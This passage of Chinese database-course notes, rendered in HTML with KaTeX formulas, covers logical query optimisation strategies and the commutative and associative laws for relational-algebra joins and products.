xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mi>A</mi><mi>R</mi><mi>D</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi></mrow><annotation encoding="application/x-tex">CARD\_NO</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9933em;vertical-align:-0.31em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span></span></span></span></eq>为图书证号<br><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mi>O</mi><mi>A</mi><mi>D</mi><mi>S</mi><mo stretchy="false">(</mo><mi>C</mi><mi>A</mi><mi>R</mi><mi>D</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi><mo separator="true">,</mo><mi>L</mi><mi>C</mi><mi mathvariant="normal">_</mi><mi>N</mi><mi>O</mi><mo separator="true">,</mo><mi>D</mi><mi>A</mi><mi>T</mi><mi>E</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">LOADS(CARD\_NO,LC\_NO,DATE)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">L</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.02778em;">NO</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05764em;">TE</span><span class="mclose">)</span></span></span></span></eq></p><h4 id="%EF%BC%882%EF%BC%89%E7%94%A8%E8%AF%AD%E6%B3%95%E6%A0%91%E8%A1%A8%E8%BE%BE%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F" tabindex="-1">（2）用语法树表达关系代数表达式</h4><ul><li>由树叶向树根反映了操作的先后次序</li></ul><h4 id="%EF%BC%883%EF%BC%89%E9%80%BB%E8%BE%91%E4%BC%98%E5%8C%96%E7%9A%84%E7%AD%96%E7%95%A5" tabindex="-1">（3）逻辑优化的策略</h4><ul><li>尽可能地早做选择和投影<ul><li>可以使得中间结果变小，减小几个数量级的执行时间</li></ul></li><li>把选择和投影串接起来：<ul><li>一元运算序列可以一起执行，只需对整个关系扫描一遍</li></ul></li><li>把投影与其前后的二元运算结合起来<ul><li>在第一次用关系时去掉一些无关属性，可以避免多次扫描整个关系</li></ul></li><li>把某些选择与其前的笛卡尔积合并成一个连接<ul><li>当<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>×</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">R\times S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></eq>前有选择运算且期中有条件是R，S属性间的比较运算时，可将其转化为连接运算可节省时间</li></ul></li><li>执行连接运算前对关系适当预处理<ul><li>文件排序，建立临时索引等，可以使得俩关系公共值高效连接</li></ul></li><li>找出表达式里的公共子表达式<ul><li>若公共子表达式结果不大，可以预先计算，以后可读入此结果，节省时间较多，在试图情况下尤其有用</li></ul></li></ul><h3 id="2104-%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0%E6%93%8D%E4%BD%9C%E6%AC%A1%E5%BA%8F%E4%BA%A4%E6%8D%A2%E7%9A%84%E7%AD%89%E4%BB%B7%E6%80%A7" tabindex="-1">2104 关系代数操作次序交换的等价性</h3><h4 id="%EF%BC%881%EF%BC%89%E7%AD%89%E4%BB%B7%E6%80%A7" tabindex="-1">（1）等价性</h4><p>定义：</p><ul><li>设<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是两个关系操作表达式，若<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>表示相同的映射，记当<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的同名变量带入相同的关系后产生相同的结果(影响几何)，则说<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1,E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是等价的，记为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_1\equiv E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%93%AA%E4%BA%9B%E5%85%B3%E7%B3%BB%E6%93%8D%E4%BD%9C%E6%AC%A1%E5%BA%8F%E5%8F%AF%E4%BB%A5%E4%BA%A4%E6%8D%A2" tabindex="-1">（2）哪些关系操作次序可以交换</h4><h5 id="%E5%AE%9A%E7%90%86l1%EF%BC%9A%E8%BF%9E%E6%8E%A5%E4%B8%8E%E8%BF%9E%E6%8E%A5%EF%BC%8C%E7%A7%AF%E4%B8%8E%E7%A7%AF%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L1：连接与连接，积与积的交换律</h5><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><msub><mo>⋈</mo><mi>F</mi></msub><msub><mi>E</mi><mn>2</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>2</mn></msub><msub><mo>⋈</mo><mi>F</mi></msub><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1 \Join_F E_2\equiv E_2 \Join_F E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo>⋈</mo><msub><mi>E</mi><mn>2</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>2</mn></msub><mo>⋈</mo><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1 \Join E_2\equiv E_2 \Join E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⋈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub><mo>×</mo><msub><mi>E</mi><mn>2</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>2</mn></msub><mo>×</mo><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1 \times E_2\equiv E_2\times E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq></li></ul><p>并，交运算也有交换律</p><h5 id="%E5%AE%9A%E7%90%86l2%EF%BC%9A%E5%AE%9A%E7%90%86l1%EF%BC%9A%E8%BF%9E%E6%8E%A5%E4%B8%8E%E8%BF%9E%E6%8E%A5%EF%BC%8C%E7%A7%AF%E4%B8%8E%E7%A7%AF%E7%9A%84%E7%BB%93%E5%90%88%E5%BE%8B" tabindex="-1">定理L2：定理L1：连接与连接，积与积的结合律</h5><ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><msub><mo>⋈</mo><mrow><mi>F</mi><mn>1</mn></mrow></msub><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><msub><mo>⋈</mo><msub><mi>F</mi><mn>2</mn></msub></msub><msub><mi>E</mi><mn>3</mn></msub><mo>≡</mo><msub><mi>E</mi><mn>1</mn></msub><msub><mo>⋈</mo><mrow><mi>F</mi><mn>1</mn></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><msub><mo>⋈</mo><msub><mi>F</mi><mn>2</mn></msub></msub><msub><mi>E</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(E_1\Join_{F1}E_2)\Join_{F_2}E_3\equiv E_1\Join_{F1}(E_2\Join_{F_2}E_3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel">⋈</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" 